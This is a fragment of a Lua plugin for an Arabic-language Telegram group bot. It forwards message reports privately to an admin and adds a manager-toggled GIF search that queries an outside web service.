local Info_Chats = bot.getSupergroupFullInfo(msg.chat_id)
local nameuser = bot.getUser(msg.sender_id.user_id)
if nameuser.first_name then
nameuser = "["..nameuser.first_name.."](tg://user?id="..nameuser.id..")"
else
nameuser = 'لا يوجد اسم'
end
local nameuserr = bot.getUser(Remsg.sender_id.user_id)
if nameuserr.first_name then
nameuserr = "["..nameuserr.first_name.."](tg://user?id="..nameuserr.id..")"
else
nameuserr = 'لا يوجد اسم'
end
local id = tostring(msg.chat_id)
gt = string.upper(id:gsub('-100',''))
gtr = math.floor(msg.reply_to_message_id/2097152/0.5)
telink = "http://t.me/c/"..gt.."/"..gtr..""
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
textd = '⇜ فيه بلاغ جديد ⚠️\n- القروب : ['..Get_Chat.title..']('..Info_Chats.invite_link.invite_link..')\n\n- الساعة : '..os.date("%p %I:%M:%S")..'\n- التاريخ : '..os.date("%Y/%m/%d")..'\n- صاحب البلاغ : '..nameuser..'\n- صاحب الرسالة : '..nameuserr..'\n- رابط الرسالة : '..telink..''
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{{text="• مسح الرسالة •",data = msg.reply_to_message_id..":kk:"..gt.."/delreb:"..UserInfo.id}},
}
}
bot.sendText(UserInfo.id,0,textd,"md",false, false, false, false, reply_markup)
end
end
if text == "تفعيل بحث المتحركات" or text == "تفعيل gif" then
if not msg.Manger then
return send(msg.chat_id,msg.id,"• هذا الأمر يخص المدير")
end
Redis:set(Fast..msg.chat_id..'gif:search',true)
send(msg.chat_id,msg.id,"• تم تفعيل بحث المتحركات")
end
if text == "تعطيل بحث المتحركات" or text == "تعطيل gif" then
if not msg.Manger then
return send(msg.chat_id,msg.id,"• هذا الأمر يخص المدير")
end
Redis:del(Fast..msg.chat_id..'gif:search')
send(msg.chat_id,msg.id,"• تم تعطيل بحث المتحركات")
end
if text and text:match("^gif (.*)$") then
if not Redis:get(Fast..msg.chat_id..'gif:search') then
return send(msg.chat_id,msg.id,"• البحث مقفل 🔒 \n• ارسل `تفعيل gif` لتفعيله","md")
end
local txx = text:match("^gif (.*)$")
local url = https.request("https://ayad-12.xyz/apies/gif_search.php?q="..URL.escape(txx))
if url == "null" then
return send(msg.chat_id,msg.id,"• لم اجد شيئا 🫤")
end
local js = json:decode(url)
for i = 1,5 do
bot.sendAnimation(msg_chat_id,msg.id,js.gifs[i],'',"md")
end
end


end
return {Fast = gif}
